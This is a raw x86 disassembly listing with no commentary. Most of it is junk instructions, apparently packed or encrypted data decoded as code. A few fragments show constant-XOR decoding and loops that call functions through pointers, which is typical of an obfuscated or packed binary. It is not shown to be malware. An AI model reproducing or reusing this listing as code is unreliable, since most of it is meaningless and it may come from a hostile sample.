  41779a:	pcmpeqw mm2,mm4
  41779d:	push   0xffffffd8
  41779f:	pop    esp
  4177a0:	cld    
  4177a1:	add    cl,bh
  4177a3:	mov    esp,0x48d565b6
  4177a8:	icebp  
  4177a9:	mov    dl,0xf7
  4177ab:	jge    0x417779
  4177ad:	pop    ss
  4177ae:	push   0xffffff87
  4177b0:	xor    al,0x64
  4177b2:	add    DWORD PTR [edx+0x2ca52fbf],esp
  4177b8:	in     al,dx
  4177b9:	inc    esp
  4177ba:	fidivr DWORD PTR [ebx+edi*4+0x32]
  4177be:	adc    al,0xd7
  4177c0:	xchg   esi,eax
  4177c1:	jp     0x4177e1
  4177c3:	lea    edi,[ecx+edx*4-0x4e7c8dec]
  4177ca:	loop   0x41777c
  4177cc:	scas   eax,DWORD PTR es:[edi]
  4177cd:	add    eax,esp
  4177cf:	int3   
  4177d0:	cmp    dl,BYTE PTR [edx]
  4177d2:	jno    0x4177aa
  4177d4:	movups XMMWORD PTR [ecx+edx*8],xmm1
  4177d8:	and    DWORD PTR [ebp+0x5fbebc19],ebp
  4177de:	or     ebx,DWORD PTR [edx]
  4177e0:	pusha  
  4177e1:	icebp  
  4177e2:	xchg   dl,bh
  4177e4:	pop    es
  4177e5:	cmp    edi,DWORD PTR [esi-0x16]
  4177e8:	push   esp
  4177e9:	mov    edx,DWORD PTR [edi+0x73530de5]
  4177ef:	mov    ebp,0x72426ad3
  4177f4:	cmovne edi,esi
  4177f7:	push   esp
  4177f8:	sub    BYTE PTR [esi+0x24],cl
  4177fb:	or     ebp,DWORD PTR [edi]
  4177fd:	test   eax,0x731857d0
  417802:	icebp  
  417803:	shl    ah,1
  417805:	sub    cl,ch
  417807:	mov    esi,0x2a07ce9d
  41780c:	fwait
  41780d:	in     eax,0x38
  41780f:	test   ah,dl
  417811:	fbstp  TBYTE PTR [esp+ecx*8+0x4a]
  417815:	jg     0x4177ad
  417817:	iret   
  417818:	adc    al,0x33
  41781a:	dec    esi
  41781b:	push   ecx
  41781c:	sbb    edi,ebx
  41781e:	push   edi
  41781f:	enter  0xc39d,0xf9
  417823:	or     al,0x35
  417825:	sub    eax,0xe85132b4
  41782a:	int3   
  41782b:	repz dec ebx
  41782d:	cmp    DWORD PTR [ebx-0x63],eax
  417830:	and    BYTE PTR [ebp-0x58b34601],ah
  417836:	test   al,0xbf
  417838:	jp     0x4177c9
  41783a:	loop   0x4177ca
  41783c:	aas    
  41783d:	mov    ecx,0x4a20475f
  417842:	xchg   ecx,eax
  417843:	sbb    cl,bh
  417845:	pop    esi
  417846:	out    0xa7,al
  417848:	mov    al,ds:0xa15f392e
  41784d:	dec    eax
  41784e:	cdq    
  41784f:	mov    ah,0xf9
  417851:	mov    esi,esp
  417853:	jecxz  0x4177ff
  417855:	cmp    al,ch
  417857:	cmp    al,0x9f
  417859:	jg     0x41789f
  41785b:	shl    DWORD PTR [ebx+eiz*1],0x56
  41785f:	hlt    
  417860:	mov    cl,BYTE PTR [ebx+0x17906e92]
  417866:	pushf  
  417867:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  417869:	adc    eax,0xbe278fd0
  41786e:	and    ebp,DWORD PTR [esi+eax*2+0x54]
  417872:	sub    edi,edx
  417874:	call   0xb583:0x9c5ebb0d
  41787b:	in     al,dx
  41787c:	mov    al,0x6e
  41787e:	cmp    cl,BYTE PTR [eax]
  417880:	add    dl,BYTE PTR [esi+ecx*2+0x66]
  417884:	(bad)  
  417885:	sbb    DWORD PTR ds:0x3c075ad5,esp
  41788b:	mov    dh,0xe1
  41788d:	pushf  
  41788e:	or     DWORD PTR [ecx],edi
  417890:	xchg   edx,eax
  417891:	pop    edi
  417892:	sbb    eax,DWORD PTR [esi]
  417894:	adc    eax,edx
  417896:	repz cmp eax,0xff8dd796
  41789c:	sti    
  41789d:	sbb    ecx,DWORD PTR [edi]
  41789f:	das    
  4178a0:	push   DWORD PTR [esi+0x41]
  4178a3:	xchg   edi,eax
  4178a4:	cwde   
  4178a5:	lahf   
  4178a6:	out    dx,eax
  4178a7:	fimul  DWORD PTR [eax+0xbfaba78]
  4178ad:	inc    edi
  4178ae:	mov    ebp,0x392e7f55
  4178b3:	inc    eax
  4178b4:	jne    0x41786c
  4178b6:	in     eax,dx
  4178b7:	fisubr DWORD PTR [edx+0x28323d95]
  4178bd:	adc    edx,DWORD PTR [ebx+0x2e]
  4178c0:	(bad)  [edx+0x4f]
  4178c3:	mov    ah,ah
  4178c5:	push   edx
  4178c6:	fcmove st,st(5)
  4178c8:	jns    0x417948
  4178ca:	outs   dx,DWORD PTR ds:[esi]
  4178cb:	sbb    bh,BYTE PTR [ecx-0x974263e]
  4178d1:	add    ecx,DWORD PTR [eax+0x3c]
  4178d4:	jmp    0x417afc
  4178d9:	cmp    eax,0xced7cecf
  4178de:	aad    0xc5
  4178e0:	aad    0x63
  4178e2:	popa   
  4178e3:	adc    DWORD PTR [edi],edx
  4178e5:	add    esi,DWORD PTR [esi]
  4178e7:	addr16 mov edx,0x787f3304
  4178ed:	add    eax,0xda78787e
  4178f2:	popa   
  4178f3:	shr    DWORD PTR [ecx-0x7a],0x4
  4178f7:	shr    cl,1
  4178f9:	dec    ecx
  4178fa:	call   0x46281949
  4178ff:	and    esi,DWORD PTR [eax]
  417901:	mov    esp,ebx
  417903:	add    DWORD PTR [edi],ebx
  417905:	and    BYTE PTR [eax+0x5b],0x14
  417909:	mov    ebp,0x473cb94c
  41790e:	lods   al,BYTE PTR ds:[esi]
  41790f:	clc    
  417910:	or     eax,0x876c4d75
  417915:	repz xchg ecx,eax
  417917:	mov    ds,WORD PTR [eax+0x111ab580]
  41791d:	in     al,0xb3
  41791f:	pop    edi
  417920:	inc    edi
  417921:	pusha  
  417922:	sub    al,0xe6
  417924:	je     0x4178b9
  417926:	jg     0x417965
  417928:	shl    esi,0x31
  41792b:	int3   
  41792c:	repz rcl bl,1
  41792f:	mov    cl,0xbd
  417931:	xchg   ebp,eax
  417932:	dec    edx
  417933:	sbb    al,0xf6
  417935:	shl    DWORD PTR [eax],cl
  417937:	adc    DWORD PTR [esp+eiz*8+0x7f],edi
  41793b:	ret    
  41793c:	jg     0x417909
  41793e:	mov    edx,DWORD PTR [ebp-0x47]
  417941:	je     0x417934
  417943:	sbb    al,0x70
  417945:	dec    ebx
  417946:	faddp  st(1),st
  417948:	push   0x3fbc2066
  41794d:	(bad)  
  41794e:	sbb    eax,0x81b88fb
  417953:	and    BYTE PTR [edx],0x31
  417956:	xor    ebp,edx
  417958:	loop   0x417925
  41795a:	jnp    0x417983
  41795c:	je     0x417967
  41795e:	adc    esi,DWORD PTR [edi]
  417960:	mov    ds:0xc18af53f,eax
  417965:	(bad)  
  417966:	inc    BYTE PTR [esi+0x4a]
  417969:	xor    al,0xf5
  41796b:	(bad)  
  41796c:	push   ebp
  41796d:	(bad)  
  41796f:	or     cl,BYTE PTR [eax]
  417971:	sbb    ah,ch
  417973:	call   0xb4e0:0x304005ed
  41797a:	gs in  al,dx
  41797c:	push   esi
  41797d:	jb     0x417977
  41797f:	icebp  
  417980:	xor    edx,DWORD PTR [eax+0x2d]
  417983:	(bad)  
  417984:	jl     0x41791f
  417986:	xor    DWORD PTR [ecx+0xe],edx
  417989:	lahf   
  41798a:	mov    edi,DWORD PTR [edi-0x3f]
  41798d:	mul    DWORD PTR [edx-0x548555d9]
  417993:	dec    edx
  417994:	sbb    BYTE PTR ds:0x461b3a40,ah
  41799a:	mov    edi,0x2dc60845
  41799f:	xchg   ebx,eax
  4179a0:	jmp    0x47f7:0x27b584df
  4179a7:	and    ah,BYTE PTR [ebp-0x23f42f32]
  4179ad:	rcl    BYTE PTR [eax-0xc7e654e],0x80
  4179b4:	rcl    ecx,1
  4179b6:	adc    DWORD PTR [esi-0x7b93d1e4],esp
  4179bc:	stos   DWORD PTR es:[edi],eax
  4179bd:	and    al,0x2b
  4179bf:	test   al,0x7b
  4179c1:	mov    edx,0x4693df6f
  4179c6:	sbb    DWORD PTR [edi-0x8],eax
  4179c9:	imul   al
  4179cb:	fsubr  DWORD PTR [ecx]
  4179cd:	jnp    0x417a08
  4179cf:	shr    DWORD PTR [esi],0xea
  4179d2:	jbe    0x4179f9
  4179d4:	(bad)  
  4179d5:	adc    edx,DWORD PTR [ebp-0x1bc1dd0e]
  4179db:	je     0x4179af
  4179dd:	arpl   di,di
  4179df:	mov    ecx,0xb623387a
  4179e4:	repnz mov ch,0x2b
  4179e7:	sbb    al,0x41
  4179e9:	sahf   
  4179ea:	and    eax,DWORD PTR [ebx-0x135957b]
  4179f0:	fwait
  4179f1:	inc    esp
  4179f2:	xor    eax,0x8b09f4ec
  4179f7:	xchg   ebp,eax
  4179f8:	push   cs
  4179f9:	sti    
  4179fa:	icebp  
  4179fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179fc:	call   0xce12:0xeef5e89b
  417a03:	xor    al,0xec
  417a05:	mov    esi,0xcfa427f4
  417a0a:	mov    ah,cl
  417a0c:	add    eax,0x11ddd11f
  417a11:	sbb    BYTE PTR ds:0xd570495d,dl
  417a17:	xlat   BYTE PTR ds:[ebx]
  417a18:	test   BYTE PTR [eax-0x56],ch
  417a1b:	sub    al,0x9f
  417a1d:	and    BYTE PTR ds:0xcbbe6ae2,cl
  417a23:	outs   dx,DWORD PTR ds:[esi]
  417a24:	fnstenv [ecx]
  417a26:	mov    fs,esi
  417a28:	push   ebp
  417a29:	inc    ecx
  417a2a:	pop    eax
  417a2b:	sbb    DWORD PTR [ebp+0x3ff4be8],ebp
  417a31:	jno    0x417a2f
  417a33:	push   ds
  417a34:	(bad)  
  417a35:	aad    0x1e
  417a37:	mov    ebx,0xc6ab362b
  417a3c:	inc    esi
  417a3d:	xor    cl,BYTE PTR [ebp+esi*2+0x66]
  417a41:	sbb    dl,BYTE PTR [edi+0x3b55ea95]
  417a47:	xchg   BYTE PTR ds:0xc8f9ace4,ah
  417a4d:	retf   0x3783
  417a50:	out    0xff,al
  417a52:	dec    esi
  417a53:	sti    
  417a54:	js     0x417a95
  417a56:	shl    BYTE PTR [ebp+0x3f25e40b],0xdb
  417a5d:	mov    ecx,0x612e0038
  417a62:	and    DWORD PTR [ebx-0xedae7d7],eax
  417a68:	das    
  417a69:	addr16 and eax,0x375d6a35
  417a6f:	mov    edi,0xa5e286a5
  417a74:	push   cs
  417a75:	(bad)  
  417a76:	xor    edi,DWORD PTR [esi+edi*1+0x57]
  417a7a:	lea    esi,[eax+0x26]
  417a7d:	sbb    edi,0x30f30745
  417a83:	fmul   QWORD PTR [eax]
  417a85:	pop    ecx
  417a86:	cmp    al,0x25
  417a88:	test   al,0x51
  417a8a:	int3   
  417a8b:	popa   
  417a8c:	cwde   
  417a8d:	inc    esp
  417a8e:	sti    
  417a8f:	mov    ch,0xab
  417a91:	fld    QWORD PTR es:[eax]
  417a94:	pusha  
  417a95:	arpl   sp,di
  417a97:	mov    BYTE PTR [ecx+0x18df39de],bh
  417a9d:	push   0x77641a7c
  417aa2:	mov    al,0x10
  417aa4:	jl     0x417a55
  417aa6:	cmc    
  417aa7:	fucomi st,st(4)
  417aa9:	cmp    BYTE PTR [esi],bl
  417aab:	rcl    cl,cl
  417aad:	dec    ecx
  417aae:	mov    BYTE PTR [esi],ch
  417ab0:	sub    DWORD PTR [eax-0x4256d3dc],ebp
  417ab6:	aas    
  417ab7:	retf   
  417ab8:	fcomp  DWORD PTR [eax+edx*4-0x79]
  417abc:	jmp    0x7f07:0x9fb6e10
  417ac3:	mov    esi,DWORD PTR [edx+0x54272956]
  417ac9:	inc    esi
  417aca:	jl     0x417a61
  417acc:	add    al,0xba
  417ace:	imul   ecx,DWORD PTR [ecx+0x29],0xfffffff3
  417ad2:	sub    ah,BYTE PTR [edi-0x8]
  417ad5:	cld    
  417ad6:	jp     0x417a83
  417ad8:	es mov al,0x89
  417adb:	adc    ch,bl
  417add:	push   0xbc68eb55
  417ae2:	iret   
  417ae3:	test   BYTE PTR [ecx],dl
  417ae5:	add    dh,al
  417ae7:	shl    BYTE PTR [edx],0x5a
  417aea:	call   0xfc707ad1
  417aef:	mov    edx,0xab861d5e
  417af4:	jecxz  0x417ad6
  417af6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417af7:	je     0x417ad2
  417af9:	ins    BYTE PTR es:[edi],dx
  417afa:	add    edx,DWORD PTR [ecx-0x46]
  417afd:	push   eax
  417afe:	or     BYTE PTR [ecx+0x7],dl
  417b01:	mov    DWORD PTR [ebp+0x8],ecx
  417b04:	mov    eax,DWORD PTR [ebp-0x4]
  417b07:	xor    eax,edx
  417b09:	push   esi
  417b0a:	mov    esi,DWORD PTR [ebp+0x8]
  417b0d:	mov    ecx,0x327298
  417b12:	add    eax,ecx
  417b14:	cmp    DWORD PTR [esi+0x54],eax
  417b17:	pop    esi
  417b18:	je     0x417b26
  417b1e:	mov    eax,DWORD PTR [ebp+0x8]
  417b21:	jmp    0x417d67
  417b26:	mov    eax,DWORD PTR [ebp-0x4]
  417b29:	xor    eax,edx
  417b2b:	add    eax,ecx
  417b2d:	jmp    0x417d67
  417b32:	mov    eax,DWORD PTR [ebp-0x4]
  417b35:	jmp    0x417d5d
  417b3a:	cmp    eax,0xd53cc6d6
  417b3f:	int3   
  417b40:	leave  
  417b41:	fnstenv [esi-0x47]
  417b44:	or     eax,0xf3ed2e6c
  417b49:	adc    WORD PTR [ecx],si
  417b4c:	jg     0x417bc6
  417b4e:	add    eax,0x2d78787e
  417b53:	or     dh,BYTE PTR [esi]
  417b55:	test   DWORD PTR ds:[bx+di],ecx
  417b59:	mov    esi,0xb8516647
  417b5e:	push   ebx
  417b5f:	jne    0x417b31
  417b61:	and    al,0x9
  417b63:	add    eax,0x91f924b8
  417b68:	inc    ebp
  417b69:	inc    eax
  417b6a:	push   ebx
  417b6b:	adc    edi,esp
  417b6d:	mov    bh,0x31
  417b6f:	xor    al,0x19
  417b71:	inc    esp
  417b72:	mov    edx,0x5e0e2ce7
  417b77:	mov    ch,0x1
  417b79:	and    esp,esi
  417b7b:	push   ebp
  417b7c:	daa    
  417b7d:	push   0xffffff95
  417b7f:	fmul   QWORD PTR [ebp-0x3f5e2d86]
  417b85:	pop    ebx
  417b86:	stc    
  417b87:	push   ebp
  417b88:	jnp    0x417bb9
  417b8a:	or     al,0xe9
  417b8c:	icebp  
  417b8d:	add    dh,BYTE PTR [edi-0x6c93067]
  417b93:	aam    0x82
  417b95:	xchg   BYTE PTR [ecx+0x31],dh
  417b98:	add    BYTE PTR [edi+0x5d],0x7
  417b9c:	inc    esp
  417b9d:	push   edx
  417b9e:	sub    eax,0x49641f9a
  417ba3:	lods   al,BYTE PTR ds:[esi]
  417ba4:	out    dx,al
  417ba5:	jl     0x417b4e
  417ba7:	(bad)  
  417ba8:	dec    esi
  417ba9:	cli    
  417baa:	or     edx,eax
  417bac:	jo     0x417b87
  417bae:	ds test al,0x8e
  417bb1:	ret    0xdb30
  417bb4:	into   
  417bb5:	mov    ebx,0xf9baf862
  417bba:	iret   
  417bbb:	shr    edi,1
  417bbd:	test   al,0xcb
  417bbf:	and    dh,BYTE PTR [edx-0x7c]
  417bc2:	ja     0x417c15
  417bc4:	push   esi
  417bc5:	or     bh,BYTE PTR [ecx+eiz*4]
  417bc8:	inc    ebx
  417bc9:	pop    es
  417bca:	xor    al,0x71
  417bcc:	mov    edi,DWORD PTR [ebx+ecx*2-0xcce7dc3]
  417bd3:	mov    al,0xbd
  417bd5:	outs   dx,BYTE PTR ds:[esi]
  417bd6:	jno    0x417c54
  417bd8:	or     BYTE PTR [edi],dl
  417bda:	out    0xba,al
  417bdc:	(bad)  
  417bdd:	xor    bl,ah
  417bdf:	lods   eax,DWORD PTR ds:[esi]
  417be0:	je     0x417bef
  417be2:	std    
  417be3:	or     ch,BYTE PTR gs:[ebx]
  417be6:	bound  ecx,QWORD PTR [ecx+ebx*1+0x2498eec2]
  417bed:	jecxz  0x417b83
  417bef:	(bad)  
  417bf1:	call   0x160c:0xc15671e6
  417bf8:	push   es
  417bf9:	retf   
  417bfa:	or     BYTE PTR [edx+0xf71dea0],ah
  417c00:	pop    edx
  417c01:	daa    
  417c02:	fcmovne st,st(6)
  417c04:	fdivr  DWORD PTR [ecx]
  417c06:	out    dx,al
  417c07:	pop    edx
  417c08:	jbe    0x417c54
  417c0a:	pop    edi
  417c0b:	and    DWORD PTR [ebx-0x44],0xe053ec98
  417c12:	push   0xf8d263c8
  417c17:	ret    0xf1ef
  417c1a:	loop   0x417c60
  417c1c:	cmp    BYTE PTR [ebp-0x2575502b],dl
  417c22:	inc    ebp
  417c23:	int    0x7b
  417c25:	xchg   ecx,eax
  417c26:	lock and al,0xd3
  417c29:	fldenv [ebx]
  417c2b:	xor    BYTE PTR [eax-0x47f87030],0x3
  417c32:	in     al,dx
  417c33:	leave  
  417c34:	xlat   BYTE PTR ds:[ebx]
  417c35:	push   edi
  417c36:	mov    esi,0x3ed75d17
  417c3b:	mov    bh,0xf7
  417c3d:	(bad)  
  417c3e:	sahf   
  417c3f:	test   eax,0xa9cdc27a
  417c44:	(bad)  
  417c45:	sub    BYTE PTR [esi],dh
  417c47:	mov    al,ds:0x358b24be
  417c4c:	mov    ch,0xa5
  417c4e:	js     0x417cca
  417c50:	sbb    BYTE PTR [edx],0xc
  417c53:	push   ss
  417c54:	xlat   BYTE PTR ds:[ebx]
  417c55:	sahf   
  417c56:	mov    eax,ds:0xa3fc5c06
  417c5b:	in     al,dx
  417c5c:	loope  0x417cd0
  417c5e:	mov    al,0x91
  417c60:	xchg   esi,eax
  417c61:	adc    BYTE PTR [ebx+0x57fbd473],0x8d
  417c68:	xor    ah,ch
  417c6a:	div    ch
  417c6c:	and    al,0x4f
  417c6e:	xor    eax,0x4c4ed4d2
  417c73:	pop    ebx
  417c74:	sub    ebx,0xf54d03fd
  417c7a:	push   0x6a
  417c7c:	js     0x417c40
  417c7e:	mov    dh,0xad
  417c80:	dec    cl
  417c82:	push   0x28
  417c84:	in     eax,0xe2
  417c86:	mov    esi,0x4b0ba053
  417c8b:	scas   al,BYTE PTR es:[edi]
  417c8c:	xchg   ebx,eax
  417c8d:	clc    
  417c8e:	push   ebx
  417c8f:	push   eax
  417c90:	and    al,0xfd
  417c92:	cli    
  417c93:	and    al,0xa
  417c95:	pop    esp
  417c96:	and    al,0x65
  417c98:	sti    
  417c99:	rol    al,0x28
  417c9c:	adc    al,BYTE PTR [edi]
  417c9e:	sub    eax,0xdabdd095
  417ca3:	int    0x74
  417ca5:	cmp    DWORD PTR [ecx-0x8],0x565b0ced
  417cac:	pop    ebp
  417cad:	dec    DWORD PTR [ecx]
  417caf:	ins    BYTE PTR es:[edi],dx
  417cb0:	fmul   DWORD PTR [ebx+0x71]
  417cb3:	or     esi,DWORD PTR [edi+edi*1]
  417cb6:	push   ebx
  417cb7:	dec    esi
  417cb8:	xchg   edx,eax
  417cb9:	dec    esp
  417cba:	mov    ah,0x4
  417cbc:	fiadd  DWORD PTR [edx+0x6ed7846a]
  417cc2:	push   ebp
  417cc3:	jbe    0x417c79
  417cc5:	pop    ebp
  417cc6:	pop    ecx
  417cc7:	mov    esp,0xe8619579
  417ccc:	stos   DWORD PTR es:[edi],eax
  417ccd:	scas   al,BYTE PTR es:[edi]
  417cce:	adc    al,0xe4
  417cd0:	jo     0x417d2e
  417cd2:	in     al,0xd8
  417cd4:	lods   eax,DWORD PTR ds:[esi]
  417cd6:	ds cld 
  417cd8:	ret    
  417cd9:	mov    al,0x21
  417cdb:	aas    
  417cdc:	int3   
  417cdd:	pushf  
  417cde:	loop   0x417d06
  417ce0:	int    0x72
  417ce2:	mov    ebx,0x61f4b9c4
  417ce7:	mov    ch,0x61
  417ce9:	pop    ss
  417cea:	test   eax,0x3ca2d82
  417cef:	out    0x3f,eax
  417cf1:	lock push ds
  417cf3:	xor    DWORD PTR [esi+0x43475c83],edi
  417cf9:	sbb    ah,BYTE PTR [eax+ebp*8-0x58]
  417cfd:	mov    esi,0x6807f6a4
  417d02:	test   bl,bl
  417d04:	enter  0xb307,0xaa
  417d08:	jecxz  0x417c8a
  417d0a:	jge    0x417d36
  417d0c:	dec    ebp
  417d0d:	sti    
  417d0e:	dec    esp
  417d0f:	lods   eax,DWORD PTR ds:[esi]
  417d10:	jbe    0x417cc9
  417d12:	mov    esp,ebx
  417d14:	scas   eax,DWORD PTR es:[edi]
  417d15:	mov    DWORD PTR [eax],ebx
  417d17:	out    dx,eax
  417d18:	jge    0x417d2d
  417d1a:	xchg   DWORD PTR [esi-0x3cc8d067],ecx
  417d20:	fstp   TBYTE PTR [ecx]
  417d22:	lods   al,BYTE PTR ds:[esi]
  417d24:	push   eax
  417d25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d26:	in     eax,dx
  417d27:	mov    eax,ds:0x7a558dfb
  417d2c:	pop    eax
  417d2d:	sub    al,0x6c
  417d2f:	push   esp
  417d30:	mov    ah,BYTE PTR [eax-0x6776cc25]
  417d36:	pop    ebp
  417d37:	and    eax,0x820ae397
  417d3c:	ins    BYTE PTR es:[edi],dx
  417d3d:	mov    bl,0x44
  417d3f:	pushf  
  417d40:	sub    cl,BYTE PTR [ebx]
  417d42:	inc    ebx
  417d43:	dec    ecx
  417d44:	cmc    
  417d45:	sub    BYTE PTR [edx+eax*2-0x12e2b97e],bh
  417d4c:	int    0x27
  417d4e:	push   ebp
  417d4f:	xor    al,0x89
  417d51:	add    BYTE PTR [ecx+0x8],0x86
  417d55:	xor    eax,0x568014f7
  417d5a:	hlt    
  417d5b:	std    
  417d5c:	jb     0x417d93
  417d5e:	push   eax
  417d5f:	or     BYTE PTR [ecx+0x7],dl
  417d62:	add    eax,0x327298
  417d67:	leave  
  417d68:	ret    0x4
  417d6b:	push   ebp
  417d6c:	mov    ebp,esp
  417d6e:	push   ecx
  417d6f:	and    DWORD PTR ds:0x42af81,0x0
  417d79:	jmp    0x417d8b
  417d7e:	mov    ecx,DWORD PTR ds:0x42af81
  417d84:	inc    ecx
  417d85:	mov    DWORD PTR ds:0x42af81,ecx
  417d8b:	cmp    DWORD PTR ds:0x42af81,0x13
  417d92:	jae    0x417dbe
  417d98:	cmp    DWORD PTR ds:0x42af81,0x16
  417d9f:	jne    0x417db3
  417da5:	push   0x42af85
  417daa:	push   DWORD PTR [ebp-0x18]
  417dad:	call   DWORD PTR ds:0x41d1f8
  417db3:	jmp    0x417d7e
  417db8:	adc    eax,DWORD PTR ds:0x42aefd
  417dbe:	mov    ecx,DWORD PTR [ebp+0x8]
  417dc1:	inc    eax
  417dc2:	mov    eax,0x7510850
  417dc7:	and    DWORD PTR ds:0x42afbd,0x42afb1
  417dd1:	xor    ecx,eax
  417dd3:	or     DWORD PTR ds:0x42afb5,0x42b009
  417ddd:	add    ecx,0x327298
  417de3:	mov    DWORD PTR ds:0x42aef5,0xf60
  417ded:	mov    DWORD PTR [ebp+0x10],ecx
  417df0:	not    ecx
  417df2:	mov    DWORD PTR [ebp+0x8],0xf34cebc
  417df9:	mov    DWORD PTR ds:0x42afb5,ebx
  417dff:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  417e06:	mov    DWORD PTR ds:0x42af8d,edi
  417e0c:	mov    ecx,0xf89c8539
  417e11:	push   esi
  417e12:	mov    DWORD PTR [ebp+0x10],0x70019fa
  417e19:	mov    esi,0x3248
  417e1e:	mov    esi,DWORD PTR [ebp-0x4]
  417e21:	cmp    ecx,esi
  417e23:	mov    DWORD PTR ds:0x42aed9,0x4596
  417e2d:	je     0x4187eb
  417e33:	and    DWORD PTR ds:0x42af71,0x0
  417e3d:	jmp    0x417e51
  417e42:	xor    esi,esi
  417e44:	or     esi,DWORD PTR ds:0x42af71
  417e4a:	inc    esi
  417e4b:	mov    DWORD PTR ds:0x42af71,esi
  417e51:	cmp    DWORD PTR ds:0x42af71,0x11
  417e58:	jae    0x418196
  417e5e:	cmp    DWORD PTR ds:0x42af71,0x1d
  417e65:	jne    0x417e77
  417e6b:	push   DWORD PTR [ebp-0x28]
  417e6e:	push   DWORD PTR [ebp-0x14]
  417e71:	call   DWORD PTR ds:0x41d274
  417e77:	jmp    0x417e42
  417e7c:	jmp    0x418196
  417e81:	ret    
  417e82:	ret    0xc0c0
  417e85:	(bad)
  417e88:	leave  
  417e89:	retf   0xfdf1
  417e8c:	dec    DWORD PTR [ecx+0x53]
  417e8f:	hlt    
  417e90:	fcomp  QWORD PTR [esi]
  417e92:	aaa    
  417e93:	jg     0x417f0d
  417e95:	jnp    0x417f15
  417e97:	js     0x417f11
  417e99:	mov    cl,0xb9
  417e9b:	int    0x40
  417e9d:	fcmovne st,st(2)
  417e9f:	or     al,0xcd
  417ea1:	and    DWORD PTR [esi],eax
  417ea3:	loop   0x417e84
  417ea5:	repz mov cl,0x82
  417ea8:	xchg   BYTE PTR fs:[edx-0x71],ch
  417eac:	jmp    0x417ed6
  417eae:	sub    eax,0x8f377ee5
  417eb3:	(bad)  [eax+0x43fc9765]
  417eb9:	(bad)  
  417eba:	mov    ecx,0x1102c4dc
  417ebf:	adc    al,BYTE PTR [esi]
  417ec1:	outs   dx,BYTE PTR ds:[esi]
  417ec2:	cld    
  417ec3:	mov    eax,0x17f371ac
  417ec8:	das    
  417ec9:	xor    eax,0x6c3270ab
  417ece:	retf   0xf414
  417ed1:	sub    dl,BYTE PTR [eax-0x4]
  417ed4:	gs dec eax
  417ed6:	leave  
  417ed7:	fcom   QWORD PTR [ecx-0x20b4bbc1]
  417edd:	sbb    al,0x4c
  417edf:	sbb    DWORD PTR [ecx],edx
  417ee1:	push   cs
  417ee2:	adc    BYTE PTR ds:0xfce57c55,0xca
  417ee9:	mov    edi,0x4c13da6c
  417eee:	dec    ecx
  417eef:	cmp    al,0x88
  417ef1:	inc    ebx
  417ef2:	call   0xb3b1:0x71bd17e3
  417ef9:	popf   
  417efa:	cmp    cl,dh
  417efc:	add    BYTE PTR [ebp+0x2f],bh
  417eff:	pusha  
  417f00:	add    eax,0xd883f59a
  417f05:	inc    eax
  417f06:	mov    bh,0xf3
  417f08:	jecxz  0x417f5b
  417f0a:	inc    esi
  417f0b:	outs   dx,DWORD PTR ds:[esi]
  417f0c:	les    eax,FWORD PTR [edx-0x70]
  417f0f:	shr    eax,1
  417f11:	push   0x41
  417f13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f14:	dec    eax
  417f15:	adc    DWORD PTR [ebx],esp
  417f17:	mov    ds:0x86a2d9ae,al
  417f1c:	cdq    
  417f1d:	ds xchg esp,eax
  417f1f:	sbb    eax,0x18d38213
  417f24:	xor    DWORD PTR [edx-0x5918cf8],esp
  417f2a:	jecxz  0x417f8b
  417f2c:	cmp    ah,dl
  417f2e:	sti    
  417f2f:	scas   eax,DWORD PTR es:[edi]
  417f30:	jmp    0x417f16
  417f32:	add    DWORD PTR [eax],0x79e5bb7
  417f38:	pop    ds
  417f39:	les    edx,FWORD PTR [edi+0x7b]
  417f3c:	and    ebp,0x6f593dd4
  417f42:	xchg   ebp,eax
  417f43:	xchg   esp,eax
  417f44:	retf   
  417f45:	sbb    al,0x5a
  417f47:	(bad)  
  417f49:	das    
  417f4a:	out    dx,eax
  417f4b:	loop   0x417f02
  417f4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f4e:	aas    
  417f4f:	xchg   esp,eax
  417f50:	push   es
  417f51:	sar    BYTE PTR ds:0x9e044e88,cl
  417f57:	inc    ebp
  417f58:	fnstenv [ebx+0x19f4388c]
  417f5e:	add    BYTE PTR [ebx+0x30],0x9f
  417f62:	inc    ebp
  417f63:	shl    DWORD PTR [edx+0xa],1
  417f66:	mov    bh,0xab
  417f68:	ds gs popf 
  417f6b:	test   DWORD PTR [edi],edx
  417f6d:	arpl   WORD PTR [edi+0x6eafd068],si
  417f73:	pmuludq mm1,QWORD PTR [edi-0x624a479c]
  417f7a:	push   cs
  417f7b:	mov    edi,0x33f49ae3
  417f80:	jne    0x417fa2
  417f82:	mov    eax,ds:0x9282d98
  417f87:	mov    esp,0x262712b7
  417f8c:	arpl   WORD PTR [edx-0x40],sp
  417f8f:	sub    ch,ch
  417f91:	xor    DWORD PTR [ecx+ebx*2-0x64],esp
  417f95:	and    bl,dl
  417f97:	ss in  eax,0x4
  417f9a:	xor    eax,0x4b0d98b5
  417f9f:	push   0xf68b0d6f
  417fa4:	pop    eax
  417fa5:	scas   al,BYTE PTR es:[edi]
  417fa6:	jo     0x41801f
  417fa8:	jecxz  0x417fb0
  417faa:	push   eax
  417fab:	loop   0x417f98
  417fad:	dec    eax
  417fae:	mov    ds:0x15c4b802,eax
  417fb3:	sub    al,0x9b
  417fb5:	das    
  417fb6:	or     DWORD PTR [eax-0x7f],ecx
  417fb9:	hlt    
  417fba:	mov    ch,0xec
  417fbc:	dec    ecx
  417fbd:	aam    0xb6
  417fbf:	test   al,0xab
  417fc1:	mov    bl,0xfc
  417fc3:	pop    ss
  417fc4:	push   ss
  417fc5:	(bad)  
  417fc6:	push   edx
  417fc7:	(bad)  
  417fc8:	fisubr DWORD PTR [ebx-0x43]
  417fcb:	ss (bad) ds:[edi-0x48]
  417fd0:	loopne 0x417fb6
  417fd2:	mov    cl,0xe6
  417fd4:	pop    ebp
  417fd5:	adc    al,0x70
  417fd7:	in     eax,dx
  417fd8:	shr    DWORD PTR es:[edi],cl
  417fdb:	push   esi
  417fdc:	stos   DWORD PTR es:[edi],eax
  417fdd:	cmp    al,0x14
  417fdf:	clc    
  417fe0:	std    
  417fe1:	add    al,0xc0
  417fe3:	pop    edx
  417fe4:	pop    ss
  417fe5:	sbb    DWORD PTR [edi+0x65],eax
  417fe8:	mov    bh,0x2b
